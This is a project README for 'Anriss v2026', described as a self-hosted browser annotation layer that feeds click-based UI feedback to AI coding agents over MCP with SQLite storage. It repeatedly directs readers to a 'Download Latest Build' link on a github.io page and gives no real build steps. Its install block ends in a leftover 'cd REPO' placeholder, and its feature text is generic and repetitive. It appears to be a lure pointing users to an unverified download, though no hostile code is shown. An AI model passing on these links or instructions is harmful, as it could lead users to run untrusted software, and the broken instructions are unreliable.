# Anriss v2026 - AI coding annotation tool 2026

> **A self-hosted browser annotation layer for AI coding agents, combining click-based feedback, MCP connectivity, and SQLite-backed persistence in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathankelly17/anriss-sqlite-feedback-hub?style=flat-square)](https://github.com/nathankelly17/anriss-sqlite-feedback-hub)

---

<p align="center">
  <a href="https://nathankelly17.github.io/anriss-sqlite-feedback-hub/">
    <img src="https://img.shields.io/badge/Download-Anriss%20Latest-brightgreen?style=for-the-badge" alt="Download Anriss">
  </a>
</p>

> **[Download Latest Build - Anriss v2026](https://nathankelly17.github.io/anriss-sqlite-feedback-hub/)**

---

[Download Latest Build](https://nathankelly17.github.io/anriss-sqlite-feedback-hub/)

---

## What Anriss Does

Anriss is aimed at situations where an AI agent needs exact, visual feedback on a live web page. Inside the browser, you can click elements to annotate them, combine several comments into one group, and expose the resulting structured annotation payload to agent tooling through an MCP endpoint.

It fits naturally as a self-hosted piece of the development toolchain, especially when you want a slim annotation surface that can slot into an existing setup. The stack pairs Rust for execution, SQLite for storage, and an embedded widget for the UI, making it practical for teams building with AI-assisted coding and devtools.

---

## Highlights

- Click-based annotation for web UI elements
- Grouped feedback through multi-select annotations
- MCP endpoint for agent connectivity
- W3C Web Annotation Data Model storage
- Self-hosted Rust binary with embedded widget
- Live polling for near real-time updates
- Resolve and archive flow for annotation state
- Built for AI agent and devtools workflows

---

## Installation

Clone the repo, then build it or grab the release package that matches your environment:

```bash
git clone https://github.com/nathankelly17/anriss-sqlite-feedback-hub.git
cd REPO
```

Once installed, launch the Rust binary and open either the embedded widget or the linked web interface in your browser.

---

## Usage

A common workflow is:

1. Run Anriss in your local or self-hosted environment.
2. Open the web interface and click the elements you want to annotate.
3. Add one or more notes, then attach them to the selected UI region.
4. Connect your agent or devtools client through the MCP endpoint.
5. Use live polling to review updates, then resolve or archive items once they are done.

For AI coding workflows, treat the annotation layer as a structured feedback surface so the agent can work from organized notes instead of plain text comments.

---

## Configuration

Configuration is managed through the self-hosted runtime plus the local storage layer.

A typical deployment is centered on:
- the Rust service binary
- the embedded widget for browser interaction
- SQLite for annotation persistence
- the MCP endpoint for tool integration

If behavior needs to be adjusted, use the application settings or the environment-driven options exposed by your deployment method.

---

## Requirements

- Web browser for the annotation interface
- Rust runtime/build toolchain for self-hosted deployment
- SQLite for local data storage
- A compatible MCP-aware agent or client for integration
- Enough local storage for annotation records and history

---

## FAQ

**How do I connect an agent to Anriss?**  
Use the MCP endpoint so the agent can access and operate on annotation data.

**Can I run it on my own infrastructure?**  
Yes, it is intended for self-hosted deployment.

**Where are annotations stored?**  
Annotation data is stored in SQLite using the W3C Web Annotation Data Model.

**Does it support ongoing updates?**  
Yes, live polling is available for refresh and workflow tracking.

**What if I need to clear finished items?**  
Use the resolve and archive workflow to handle completed annotations.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
